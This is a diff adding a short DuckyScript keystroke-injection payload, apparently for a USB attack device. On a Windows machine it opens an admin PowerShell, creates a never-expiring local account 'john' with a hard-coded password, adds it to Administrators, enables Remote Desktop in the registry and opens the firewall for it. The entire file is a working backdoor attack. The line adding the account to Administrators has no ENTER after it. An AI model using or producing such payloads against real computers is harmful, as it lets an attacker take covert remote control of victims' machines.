@@ -1,0 +1,21 @@
+CONTROL ESCAPE
+DELAY 1000
+STRING powershell
+DELAY 1000
+ADMIN
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 3000
+STRING NET USER john P@ssw0rd /add /y /expires:never
+ENTER
+DELAY 1000
+STRING NET LOCALGROUP Administrators john /add
+DELAY 1000
+STRING Set-ItemProperty ‘HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\‘ -Name “fDenyTSConnections” -Value 0
+ENTER
+DELAY 1000
+STRING Set-ItemProperty ‘HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\‘ -Name “UserAuthentication” -Value 1
+ENTER
+DELAY 1000
+STRING Enable-NetFirewallRule -DisplayGroup “Remote Desktop”
